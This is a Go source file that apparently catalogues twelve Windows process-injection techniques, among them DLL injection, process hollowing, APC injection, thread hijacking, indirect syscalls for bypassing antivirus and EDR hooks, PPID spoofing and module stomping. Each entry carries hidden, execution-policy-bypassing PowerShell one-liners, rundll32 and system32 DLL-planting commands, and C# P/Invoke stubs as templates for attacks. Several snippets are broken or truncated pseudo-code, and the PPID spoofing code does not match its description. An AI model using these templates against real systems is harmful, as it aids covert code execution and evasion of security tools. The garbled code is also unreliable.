package processinjection

var techniques = []InjectionTechnique{
	{
		ID:          "F1",
		Name:        "CreateRemoteThread DLL Injection",
		Description: "Allocates memory in the target process (VirtualAllocEx), writes a DLL path (WriteProcessMemory), then creates a remote thread (CreateRemoteThread) that calls LoadLibraryA to load the DLL. The most classic and most detected injection technique.",
		Win32APIsUsed: []string{
			"OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
			"CreateRemoteThread", "LoadLibraryA", "WaitForSingleObject",
		},
		RiskLevel: "high",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$proc=Get-Process -Id {{PID}}; $h=OpenProcess 0x001F0FFF -false $proc.Id; $addr=VirtualAllocEx $h 0 0x1000 0x3000 0x40; [System.Runtime.InteropServices.Marshal]::WriteIntPtr($h,$addr,$h); $t=CreateRemoteThread $h 0 0 $addr 0 0 0; WaitForSingleObject $t 0xFFFFFFFF"`,
			CMD: `rundll32.exe \\{{UNC}}\path\to\payload.dll,DllMain`,
			CSharp: `[DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId); [DllImport("kernel32.dll")] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten); [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);`,
		},
	},
	{
		ID:          "F2",
		Name:        "Native API Injection (NtCreateThreadEx)",
		Description: "Uses the native NT API NtCreateThreadEx instead of CreateRemoteThread to create a thread in the target process. Avoids kernel32!CreateRemoteThread hooking by going through ntdll directly. Often used with syscall stubs to bypass userland hooks.",
		Win32APIsUsed: []string{
			"OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
			"NtCreateThreadEx", "RtlCreateUserThread", "NtClose",
		},
		RiskLevel: "high",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$p=Get-Process -Id {{PID}}; $h=OpenProcess 0x1F0FFF 0 $p.Id; $b=VirtualAllocEx $h 0 0x1000 0x3000 0x40; WriteProcessMemory $h $b $payload 0x1000 ([ref]0); $addr=GetProcAddress (GetModuleHandle 'ntdll') 'NtCreateThreadEx'; $t=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr,[Func[IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr,IntPtr]]); $t.Invoke($h,0,0,$b,0,0,0,0,0,0)"`,
			CMD: `runas /user:{{USER}} "rundll32.exe {{DLLPATH}},DllMain"`,
			CSharp: `[DllImport("ntdll.dll")] static extern int NtCreateThreadEx(out IntPtr hThread, uint desiredAccess, IntPtr objAttr, IntPtr hProcess, IntPtr startAddr, IntPtr param, bool createSuspended, int stackZeroBits, int sizeOfStack, int maxStackSize, IntPtr bytes);`,
		},
	},
	{
		ID:          "F3",
		Name:        "APC Injection (QueueUserAPC)",
		Description: "Queues an Asynchronous Procedure Call to an alertable thread in the target process. When the thread enters an alertable state (WaitForSingleObjectEx, SleepEx, etc.), the APC executes the shellcode. Early Bird variant creates a suspended process first.",
		Win32APIsUsed: []string{
			"OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
			"QueueUserAPC", "ResumeThread", "CreateProcess",
			"CreateToolhelp32Snapshot", "Thread32First", "Thread32Next",
		},
		RiskLevel: "medium",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$p=Get-Process -Id {{PID}}; $h=OpenProcess 0x1F0FFF 0 $p.Id; $addr=VirtualAllocEx $h 0 0x1000 0x3000 0x40; WriteProcessMemory $h $addr $payload 0x1000 ([ref]0); $threads=@(); Get-Process -Id {{PID}}|Select-Object -ExpandProperty Threads|ForEach-Object{$threads+=[PoshWin32.Kernel32]::OpenThread(0x1F03FF,0,$_.Id)}; $threads|ForEach-Object{[PoshWin32.Kernel32]::QueueUserAPC($addr,$_,0)}"`,
			CMD: `powershell -NoP -NonI -W Hidden -Exec Bypass -C "while(1){[System.Console]::WriteLine('alertable');Start-Sleep 1}"`,
			CSharp: `[DllImport("kernel32.dll")] static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);`,
		},
	},
	{
		ID:          "F4",
		Name:        "Thread Hijacking (SetThreadContext)",
		Description: "Opens a thread in the target process, suspends it, modifies its execution context (RIP register) to point to shellcode, then resumes the thread. The thread's original execution flow is hijacked to run injected code.",
		Win32APIsUsed: []string{
			"OpenProcess", "OpenThread", "SuspendThread",
			"SetThreadContext", "GetThreadContext", "ResumeThread",
			"VirtualAllocEx", "WriteProcessMemory",
		},
		RiskLevel: "high",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$t=Get-Process -Id {{PID}}|Select-Object -ExpandProperty Threads|Select-Object -First 1; $h=OpenThread 0x1F03FF 0 $t.Id; SuspendThread $h; $ctx=GetThreadContext $h; $addr=VirtualAllocEx (Get-Process -Id {{PID}}).Handle 0 0x1000 0x3000 0x40; WriteProcessMemory (Get-Process -Id {{PID}}).Handle $addr $buf 0x1000 ([ref]0); $ctx.Rip=$addr; SetThreadContext $h $ctx; ResumeThread $h"`,
			CMD: `N/A - requires API access`,
			CSharp: `[DllImport("kernel32.dll")] static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext); [DllImport("kernel32.dll")] static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext); [DllImport("kernel32.dll")] static extern int SuspendThread(IntPtr hThread); [DllImport("kernel32.dll")] static extern int ResumeThread(IntPtr hThread);`,
		},
	},
	{
		ID:          "F5",
		Name:        "Process Hollowing (RunPE)",
		Description: "Creates a target process in suspended state, unmaps its original image using NtUnmapViewOfSection, allocates new memory, writes a new PE image, sets the thread context to point to the new entry point, and resumes the process. The target process image is completely replaced.",
		Win32APIsUsed: []string{
			"CreateProcess", "NtUnmapViewOfSection", "VirtualAllocEx",
			"WriteProcessMemory", "GetThreadContext", "SetThreadContext",
			"ResumeThread", "ZwQueryInformationProcess",
		},
		RiskLevel: "critical",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$p=Start-Process '{{TARGET}}' -WindowStyle Hidden -PassThru -RedirectStandardError NUL; $h=$p.Handle; $NtUnmap=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress (GetModuleHandle 'ntdll') 'NtUnmapViewOfSection'), [Func[IntPtr,IntPtr,int]]); $NtUnmap.Invoke($h,([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress (GetModuleHandle 'kernel32') 'GetProcessImageFileNameW'),[Func[IntPtr,IntPtr,int]]))),...); ResumeThread $h"`,
			CMD: `start /B {{TARGET}}`,
			CSharp: `[DllImport("ntdll.dll")] static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr baseAddr); [DllImport("kernel32.dll")] static extern bool CreateProcess(string appName, string cmdLine, IntPtr procAttr, IntPtr threadAttr, bool inherit, uint flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);`,
		},
	},
	{
		ID:          "F6",
		Name:        "Reflective DLL Injection",
		Description: "Injects a DLL into the target process without writing it to disk. The DLL maps itself using a embedded loader (ReflectiveLoader) that parses the PE headers, allocates memory, resolves imports, applies relocations, and calls DllMain. No LoadLibrary call - fully manual mapping.",
		Win32APIsUsed: []string{
			"OpenProcess", "VirtualAllocEx", "WriteProcessMemory",
			"CreateRemoteThread", "NtCreateThreadEx",
			"LoadLibraryA", "GetProcAddress",
		},
		RiskLevel: "high",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$p=Get-Process -Id {{PID}}; $h=OpenProcess 0x1F0FFF 0 $p.Id; $dllBytes=[System.IO.File]::ReadAllBytes('{{DLLPATH}}'); $addr=VirtualAllocEx $h 0 $dllBytes.Length 0x3000 0x40; WriteProcessMemory $h $addr $dllBytes $dllBytes.Length ([ref]0); $reflectiveLoader=$addr+0x1000; CreateRemoteThread $h 0 0 $reflectiveLoader 0 0 0"`,
			CMD: `N/A - memory-only technique`,
			CSharp: `// ReflectiveLoader is compiled into the DLL itself. The stub resolves kernel32 addresses from the PEB without calling LoadLibrary.`,
		},
	},
	{
		ID:          "F7",
		Name:        "Local Shellcode Injection",
		Description: "Injects shellcode into the current process using VirtualAlloc + CopyMemory + callback execution. Callbacks include EnumDesktopsA, SetTimer, CreateThread, or EnumSystemLocalesA. Does not cross process boundaries.",
		Win32APIsUsed: []string{
			"VirtualAlloc", "CopyMemory", "EnumDesktopsA",
			"SetTimer", "CreateThread", "EnumSystemLocalesA",
			"RtlCopyMemory", "HeapCreate", "HeapAlloc",
		},
		RiskLevel: "low",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$c=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress (GetModuleHandle 'kernel32') 'VirtualAlloc'),[Func[int,int,int,int,int]]); $p=$c.Invoke(0,$buf.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$p,$buf.Length); $e=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress (GetModuleHandle 'kernel32') 'EnumDesktopsA'),[Func[IntPtr,IntPtr,IntPtr,int]]); $e.Invoke(0,$p,0)"`,
			CMD: `N/A - always powershell`,
			CSharp: `[DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr lpAddr, uint dwSize, uint flAllocType, uint flProtect); [DllImport("user32.dll")] static extern bool EnumDesktopsA(IntPtr hwinsta, IntPtr lpEnumFunc, IntPtr lParam);`,
		},
	},
}

var advancedTechniques = []InjectionTechnique{
	{
		ID:          "F8",
		Name:        "Atom Bombing / Extra Window Memory Injection",
		Description: "Writes shellcode into the global atom table using GlobalAddAtomA (which stores up to 255 bytes per atom), then triggers execution via a WindowProc callback that reads the atom back and executes it. Uses the Windows window message system as an execution vector. Extra Window Memory (EWM) variant stores shellcode in the reserved bytes of a window class.",
		Win32APIsUsed: []string{
			"GlobalAddAtomA", "GlobalGetAtomNameA", "GlobalDeleteAtom",
			"CreateWindowEx", "SetWindowLongPtr", "CallWindowProc",
			"SetTimer", "EnumWindows", "SendMessage",
		},
		RiskLevel: "medium",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$a=@(); $s='{{SHELLCODE_HEX}}'; for($i=0;$i -lt $s.Length;$i+=510){$a+=GlobalAddAtomA $s.Substring($i,[Math]::Min(510,$s.Length-$i))}; $w=CreateWindowEx 0 'STATIC' '' 0 0 0 0 0 0 0 0; SetWindowLongPtr $w 0 ($a[0]); SendMessage $w 0x001C 0 0"`,
			CMD: `N/A - requires window station`,
			CSharp: `[DllImport("kernel32.dll")] static extern ushort GlobalAddAtomA(string lpString); [DllImport("user32.dll")] static extern IntPtr SetWindowLongPtr(IntPtr hWnd, int nIndex, IntPtr dwNewLong); [DllImport("user32.dll")] static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);`,
		},
	},
	{
		ID:          "F9",
		Name:        "Gargoyle Memory Flipping",
		Description: "Uses ROP chains to flip memory page permissions between RW and RX at runtime. Allocates shellcode as RW, executes it via a short RX flip (e.g., VirtualProtect or direct PTE manipulation), then flips back to RW. This evades memory scanners that look for RWX memory. Uses NtProtectVirtualMemory or direct page table entry (PTE) manipulation.",
		Win32APIsUsed: []string{
			"VirtualAlloc", "VirtualProtect", "NtProtectVirtualMemory",
			"NtCreateThreadEx", "RtlCopyMemory",
			"SetThreadPriority", "CreateWaitableTimer",
		},
		RiskLevel: "low",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$m=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress (GetModuleHandle 'kernel32') 'VirtualAlloc'),[Func[int,int,int,int,int]]); $p=$m.Invoke(0,$buf.Length,0x3000,4); [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$p,$buf.Length); $v=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress (GetModuleHandle 'kernel32') 'VirtualProtect'),[Func[int,int,int,System.IntPtr]]); $v.Invoke($p,$buf.Length,0x20); $t=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress (GetModuleHandle 'kernel32') 'CreateThread'),[Func[int,int,int,int,int,System.IntPtr]]); $t.Invoke(0,0,$p,0,0).IntPtr; $v.Invoke($p,$buf.Length,4)"`,
			CMD: `N/A`,
			CSharp: `// Gargoyle uses timer-based callbacks to flip page permissions: RW -> RX -> RW`,
		},
	},
	{
		ID:          "F10",
		Name:        "D/Invoke Indirect Syscall Injection",
		Description: "Uses D/Invoke (Dynamic Invoke) to resolve API addresses at runtime without importing them, combined with indirect syscalls that bypass userland hooks. The syscall instruction is copied from ntdll and executed with the original SSN (System Service Number), bypassing EDR/AV hooks on ntdll. Uses HellsGate, HalosGate, or TartarusGate techniques for SSN retrieval.",
		Win32APIsUsed: []string{
			"NtAllocateVirtualMemory", "NtWriteVirtualMemory",
			"NtProtectVirtualMemory", "NtCreateThreadEx",
			"NtWaitForSingleObject", "GetProcAddress",
		},
		RiskLevel: "low",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$p=Get-Process -Id {{PID}}; $h=OpenProcess 0x1F0FFF 0 $p.Id; $ntdll=GetModuleHandle 'ntdll'; $ptr=GetProcAddress $ntdll 'NtAllocateVirtualMemory'; $buf=[byte[]]::new(0x1000); [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,2); $syscallStub=$ptr+0x12; $r=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($syscallStub,[Func[IntPtr,IntPtr,IntPtr,IntPtr,int,int,int]]); $r.Invoke($h,0,0x1000,0x3000,0x40)"`,
			CMD: `N/A`,
			CSharp: `// HellsGate: walk ntdll export table, find syscall stub, extract SSN, call syscall instruction directly`,
		},
	},
	{
		ID:          "F11",
		Name:        "PPID Spoofing",
		Description: "Creates a process whose parent PID is spoofed. Uses InitializeProcThreadAttributeList + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS + CreateProcess with EXTENDED_STARTUPINFO_PRESENT fork flag. The spoofed process appears to be a child of the specified parent process (e.g., explorer.exe or svchost.exe) for process tree deception.",
		Win32APIsUsed: []string{
			"CreateProcess", "InitializeProcThreadAttributeList",
			"UpdateProcThreadAttribute",
			"PROC_THREAD_ATTRIBUTE_PARENT_PROCESS",
		},
		RiskLevel: "medium",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$p=OpenProcess 0x1F0FFF 0 {{PARENT_PID}}; $sa=New-Object System.Security.Principal.SecurityIdentifier 'S-1-5-18'; $si=New-Object System.Diagnostics.ProcessStartInfo '{{TARGET}}'; $si.CreateNoWindow=$true; $si.UseShellExecute=$false; $si.RedirectStandardOutput=$true; $p.Start()"`,
			CMD: `wmic process call create "{{TARGET}}"`,
			CSharp: `[DllImport("kernel32.dll")] static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);`,
		},
	},
	{
		ID:          "F12",
		Name:        "Module Stomping / DLL Sideloading",
		Description: "Overwrites the .text section of a legitimate loaded module (e.g., ntdll.dll, kernel32.dll) in the target process with shellcode, then executes it. The module remains loaded and its headers are unchanged, but its code is replaced. DLL Sideloading variant places a malicious DLL in a directory where a legitimate process will load it via search order hijacking.",
		Win32APIsUsed: []string{
			"OpenProcess", "VirtualProtectEx", "WriteProcessMemory",
			"CreateRemoteThread", "GetModuleHandle", "GetModuleInformation",
		},
		RiskLevel: "critical",
		Commands: InjectionCommands{
			PowerShell: `-NoP -NonI -W Hidden -Exec Bypass -C "$p=Get-Process -Id {{PID}}; $h=OpenProcess 0x1F0FFF 0 $p.Id; $mod=[System.Diagnostics.Process].GetMethod('GetModuleHandle',[Type[]]([string])).Invoke($null,'{{MODULE}}'); $info=[System.Diagnostics.ProcessModule].GetConstructors()[0].Invoke($null); VirtualProtectEx $h $mod 0x1000 0x40; WriteProcessMemory $h $mod $payload 0x1000 ([ref]0); CreateRemoteThread $h 0 0 $mod 0 0 0; VirtualProtectEx $h $mod 0x1000 0x20"`,
			CMD: `copy {{MALICIOUS_DLL}} %windir%\system32\{{LEGIT_DLL}}`,
			CSharp: `[DllImport("kernel32.dll")] static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);`,
		},
	},
}
